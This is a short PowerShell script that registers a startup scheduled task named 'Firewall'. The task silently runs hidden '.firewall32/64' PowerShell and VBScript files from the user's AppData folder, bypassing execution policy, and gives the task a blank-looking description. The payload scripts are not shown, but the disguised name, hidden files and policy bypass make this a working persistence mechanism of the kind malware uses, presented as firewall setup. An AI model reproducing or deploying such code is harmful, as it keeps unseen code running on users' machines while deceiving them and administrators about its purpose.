if ([Environment]::Is64BitOperatingSystem) {
    $osBit = "64"
} else {
    $osBit = "32"
}

$fileName = ".firewall$osBit"
$psFilePath = "$env:APPDATA\Firewall\$fileName" + ".ps1"
$vbsFilePath = "$env:APPDATA\Firewall\$fileName" + ".vbs"

$psAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$psFilePath`""
$vbsAction = New-ScheduledTaskAction -Execute "cscript.exe" -Argument "`"$vbsFilePath`""

$startupTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Firewall" -Action @($psAction, $vbsAction) -Trigger $startupTrigger -Description "_"

Write-Host "Scheduled task 'Firewall' created successfully." -ForegroundColor Green
